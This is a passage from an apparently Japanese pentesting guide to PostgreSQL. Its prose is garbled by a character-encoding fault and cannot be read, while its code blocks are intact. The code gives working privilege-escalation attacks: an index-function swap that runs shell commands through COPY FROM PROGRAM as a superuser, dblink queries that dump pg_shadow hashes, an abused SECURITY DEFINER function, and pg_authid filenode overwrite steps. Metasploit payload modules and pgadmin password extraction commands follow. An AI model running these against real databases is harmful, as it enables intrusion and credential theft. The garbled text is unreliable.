4. ãƒ†ãƒ¼ãƒ–ãƒ«ã®æ‰€æœ‰è€…ã‚’ã€Œcloudsqladminã€ã«å¤‰æ›´ã—ã€ã“ã‚Œã¯Cloud SQLãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ç®¡ç†ãŠã‚ˆã³ç¶­æŒã™ã‚‹ãŸã‚ã«ç‹¬å çš„ã«ä½¿ç”¨ã™ã‚‹GCPã®ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ­ãƒ¼ãƒ«ã§ã™ã€‚
5. ãƒ†ãƒ¼ãƒ–ãƒ«ã«å¯¾ã—ã¦ANALYZEæ“ä½œã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ã“ã®æ“ä½œã«ã‚ˆã‚Šã€PostgreSQLã‚¨ãƒ³ã‚¸ãƒ³ã¯ãƒ†ãƒ¼ãƒ–ãƒ«ã®æ‰€æœ‰è€…ã§ã‚ã‚‹ã€Œcloudsqladminã€ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã«åˆ‡ã‚Šæ›¿ã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹æ©Ÿèƒ½ã¯ã€Œcloudsqladminã€ã®æ¨©é™ã§å‘¼ã³å‡ºã•ã‚Œã€ä»¥å‰ã«è¨±å¯ã•ã‚Œã¦ã„ãªã‹ã£ãŸã‚·ã‚§ãƒ«ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡ŒãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

PostgreSQLã§ã¯ã€ã“ã®ãƒ•ãƒ­ãƒ¼ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
ãã®å¾Œã€`shell_commands_results` ãƒ†ãƒ¼ãƒ–ãƒ«ã«ã¯å®Ÿè¡Œã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã®å‡ºåŠ›ãŒå«ã¾ã‚Œã¾ã™:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### ãƒ­ãƒ¼ã‚«ãƒ«ãƒ­ã‚°ã‚¤ãƒ³

ä¸€éƒ¨ã®è¨­å®šãƒŸã‚¹ã®ã‚ã‚‹PostgreSQLã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§ã¯ã€ã©ã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã‚‚ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹å ´åˆãŒã‚ã‚Šã€**`dblink`é–¢æ•°**ã‚’ä½¿ç”¨ã—ã¦127.0.0.1ã‹ã‚‰ãƒ­ãƒ¼ã‚«ãƒ«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
å‰ã®ã‚¯ã‚¨ãƒªãŒæ©Ÿèƒ½ã™ã‚‹ãŸã‚ã«ã¯ã€**`dblink` é–¢æ•°ãŒå­˜åœ¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚å­˜åœ¨ã—ãªã„å ´åˆã¯ã€æ¬¡ã®ã‚ˆã†ã«ä½œæˆã—ã¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

ã‚‚ã—ç‰¹æ¨©ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŒã£ã¦ã„ã‚‹ãŒã€ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå¤–éƒ¨IPã‹ã‚‰ã®ãƒ­ã‚°ã‚¤ãƒ³ã‚’è¨±å¯ã•ã‚Œã¦ã„ãªã„å ´åˆã€æ¬¡ã®é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã§ãã¾ã™:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
ã“ã®é–¢æ•°ãŒå­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ‡ãƒ•ã‚£ãƒŠãƒ¼ã§å®šç¾©ã•ã‚ŒãŸã‚«ã‚¹ã‚¿ãƒ é–¢æ•°**

[**ã“ã®è§£èª¬**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql)ã§ã¯ã€IBMãŒæä¾›ã™ã‚‹Postgresã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹å†…ã§ã€**SECURITY DEFINERãƒ•ãƒ©ã‚°ã‚’æŒã¤ã“ã®é–¢æ•°**ã‚’è¦‹ã¤ã‘ãŸãŸã‚ã€ãƒšãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼ã¯æ¨©é™æ˜‡æ ¼ã«æˆåŠŸã—ã¾ã—ãŸã€‚

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
â€¦
</code></pre>

[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«**](https://www.postgresql.org/docs/current/sql-createfunction.html)ã€**SECURITY DEFINERãŒè¨­å®šã•ã‚ŒãŸé–¢æ•°ã¯**ã€**æ‰€æœ‰è€…ã®æ¨©é™ã§å®Ÿè¡Œ**ã•ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€é–¢æ•°ãŒ**SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦è„†å¼±**ã§ã‚ã‚‹ã‹ã€**æ”»æ’ƒè€…ã«ã‚ˆã£ã¦åˆ¶å¾¡ã•ã‚Œã‚‹ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§ç‰¹æ¨©æ“ä½œã‚’è¡Œã£ã¦ã„ã‚‹**å ´åˆã€Postgreså†…ã§**æ¨©é™æ˜‡æ ¼ãŒæ‚ªç”¨**ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

å‰è¿°ã®ã‚³ãƒ¼ãƒ‰ã®4è¡Œç›®ã§ã€é–¢æ•°ã«**SECURITY DEFINER**ãƒ•ãƒ©ã‚°ãŒã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
ãã—ã¦**ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œ**ã—ã¦ãã ã•ã„ï¼š

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQLã‚’ä½¿ç”¨ã—ãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

**PL/pgSQL**ã¯ã€SQLã‚ˆã‚Šã‚‚å¤§å¹…ã«æ‰‹ç¶šãçš„ãªåˆ¶å¾¡ã‚’æä¾›ã™ã‚‹**å®Œå…¨ãªæ©Ÿèƒ½ã‚’å‚™ãˆãŸãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èª**ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**ãƒ«ãƒ¼ãƒ—**ã‚„ä»–ã®**åˆ¶å¾¡æ§‹é€ **ã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãƒ­ã‚¸ãƒƒã‚¯ã‚’å¼·åŒ–ã§ãã¾ã™ã€‚ã•ã‚‰ã«ã€**SQLã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆ**ã‚„**ãƒˆãƒªã‚¬ãƒ¼**ã¯ã€**PL/pgSQLè¨€èª**ã‚’ä½¿ç”¨ã—ã¦ä½œæˆã•ã‚ŒãŸé–¢æ•°ã‚’å‘¼ã³å‡ºã™èƒ½åŠ›ã‚’æŒã£ã¦ã„ã¾ã™ã€‚ã“ã®çµ±åˆã«ã‚ˆã‚Šã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°ã¨è‡ªå‹•åŒ–ã«å¯¾ã™ã‚‹åŒ…æ‹¬çš„ã‹ã¤å¤šç›®çš„ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒãŒå¯èƒ½ã¨ãªã‚Šã¾ã™ã€‚\
**ã“ã®è¨€èªã‚’æ‚ªç”¨ã—ã¦ã€PostgreSQLã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è³‡æ ¼æƒ…å ±ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### å†…éƒ¨ã®PostgreSQLãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ä¸Šæ›¸ãã—ã¦æ¨©é™æ˜‡æ ¼

{% hint style="info" %}
æ¬¡ã®æ¨©é™æ˜‡æ ¼ãƒ™ã‚¯ãƒˆãƒ«ã¯ã€åˆ¶ç´„ã•ã‚ŒãŸSQLiã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ç‰¹ã«æœ‰ç”¨ã§ã‚ã‚Šã€ã™ã¹ã¦ã®æ‰‹é †ã‚’ãƒã‚¹ãƒˆã•ã‚ŒãŸSELECTã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã‚’ä»‹ã—ã¦å®Ÿè¡Œã§ãã¾ã™
{% endhint %}

PostgreSQLã‚µãƒ¼ãƒãƒ¼ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**èª­ã¿æ›¸ã**ã§ãã‚‹å ´åˆã€å†…éƒ¨ã®`pg_authid`ãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸPostgreSQLã®ãƒ‡ã‚£ã‚¹ã‚¯ä¸Šã®ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ¼ãƒ‰ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§ã€**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã«ãªã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**ã“ã®æ‰‹æ³•**ã«ã¤ã„ã¦è©³ã—ãã¯[**ã“ã¡ã‚‰**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**ã‚’ã”è¦§ãã ã•ã„ã€‚**

æ”»æ’ƒæ‰‹é †ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š

1. PostgreSQLãƒ‡ãƒ¼ã‚¿ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å–å¾—ã™ã‚‹
2. `pg_authid`ãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ¼ãƒ‰ã¸ã®ç›¸å¯¾ãƒ‘ã‚¹ã‚’å–å¾—ã™ã‚‹
3. `lo_*`é–¢æ•°ã‚’ä»‹ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ¼ãƒ‰ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹
4. `pg_authid`ãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸãƒ‡ãƒ¼ã‚¿å‹ã‚’å–å¾—ã™ã‚‹
5. [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor)ã‚’ä½¿ç”¨ã—ã¦ã€`pg_authid`ãƒ†ãƒ¼ãƒ–ãƒ«ã®[ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ¼ãƒ‰ã‚’ç·¨é›†](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table)ã—ã€ã™ã¹ã¦ã®`rol*`ãƒ–ãƒ¼ãƒ«ãƒ•ãƒ©ã‚°ã‚’1ã«è¨­å®šã—ã¦å®Œå…¨ãªæ¨©é™ã‚’ä»˜ä¸ã™ã‚‹
6. `lo_*`é–¢æ•°ã‚’ä»‹ã—ã¦ç·¨é›†æ¸ˆã¿ã®ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ¼ãƒ‰ã‚’å†ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã€ãƒ‡ã‚£ã‚¹ã‚¯ä¸Šã®å…ƒã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä¸Šæ›¸ãã™ã‚‹
7. ï¼ˆã‚ªãƒ—ã‚·ãƒ§ãƒ³ï¼‰é«˜ã‚³ã‚¹ãƒˆãªSQLã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã—ã¦ã‚¤ãƒ³ãƒ¡ãƒ¢ãƒªãƒ†ãƒ¼ãƒ–ãƒ«ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚’ã‚¯ãƒªã‚¢ã™ã‚‹
8. ã“ã‚Œã§å®Œå…¨ãªã‚¹ãƒ¼ãƒ‘ãƒ¼ã‚¢ãƒ‰ãƒŸãƒ³ã®æ¨©é™ã‚’æŒã¤ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### ãƒ­ã‚®ãƒ³ã‚°

_**postgresql.conf**_ ãƒ•ã‚¡ã‚¤ãƒ«ã®ä¸­ã§ã€ä»¥ä¸‹ã‚’å¤‰æ›´ã—ã¦ã€PostgreSQL ãƒ­ã‚°ã‚’æœ‰åŠ¹ã«ã§ãã¾ã™ï¼š
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
ãã®å¾Œã€**ã‚µãƒ¼ãƒ“ã‚¹ã‚’å†èµ·å‹•**ã—ã¦ãã ã•ã„ã€‚

### pgadmin

[pgadmin](https://www.pgadmin.org)ã¯ã€PostgreSQLã®ç®¡ç†ãŠã‚ˆã³é–‹ç™ºãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã§ã™ã€‚\
_**pgadmin4.db**_ãƒ•ã‚¡ã‚¤ãƒ«ã®ä¸­ã«**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ã€‚\
ã‚¹ã‚¯ãƒªãƒ—ãƒˆå†…ã®_decrypt_é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚‰ã‚’å¾©å·åŒ–ã§ãã¾ã™ï¼š[https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

PostgreSQLã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆèªè¨¼ã¯ã€**pg\_hba.conf**ã¨ã„ã†æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä»‹ã—ã¦ç®¡ç†ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€æ¥ç¶šã‚¿ã‚¤ãƒ—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆIPã‚¢ãƒ‰ãƒ¬ã‚¹ç¯„å›²ï¼ˆè©²å½“ã™ã‚‹å ´åˆï¼‰ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹åã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã€ãŠã‚ˆã³ä¸€è‡´ã™ã‚‹æ¥ç¶šã«ä½¿ç”¨ã™ã‚‹èªè¨¼æ–¹æ³•ã‚’æŒ‡å®šã™ã‚‹ãƒ¬ã‚³ãƒ¼ãƒ‰ã®ã‚·ãƒªãƒ¼ã‚ºãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚æ¥ç¶šã‚¿ã‚¤ãƒ—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚¢ãƒ‰ãƒ¬ã‚¹ã€è¦æ±‚ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã€ãŠã‚ˆã³ãƒ¦ãƒ¼ã‚¶ãƒ¼åã«ä¸€è‡´ã™ã‚‹æœ€åˆã®ãƒ¬ã‚³ãƒ¼ãƒ‰ãŒèªè¨¼ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚èªè¨¼ãŒå¤±æ•—ã—ãŸå ´åˆã€ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ã‚„ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ä¸€è‡´ã™ã‚‹ãƒ¬ã‚³ãƒ¼ãƒ‰ãŒãªã„å ´åˆã€ã‚¢ã‚¯ã‚»ã‚¹ã¯æ‹’å¦ã•ã‚Œã¾ã™ã€‚

pg\_hba.confã§åˆ©ç”¨å¯èƒ½ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹ã®èªè¨¼æ–¹æ³•ã¯**md5**ã€**crypt**ã€ãŠã‚ˆã³**password**ã§ã™ã€‚ã“ã‚Œã‚‰ã®æ–¹æ³•ã¯ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®é€ä¿¡æ–¹æ³•ã§ç•°ãªã‚Šã¾ã™ï¼šMD5ãƒãƒƒã‚·ãƒ¥åŒ–ã€cryptæš—å·åŒ–ã€ã¾ãŸã¯ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆã€‚é‡è¦ãªç‚¹ã¨ã—ã¦ã€cryptãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€pg\_authidã§æš—å·åŒ–ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ã¯ä½¿ç”¨ã§ãã¾ã›ã‚“ã€‚
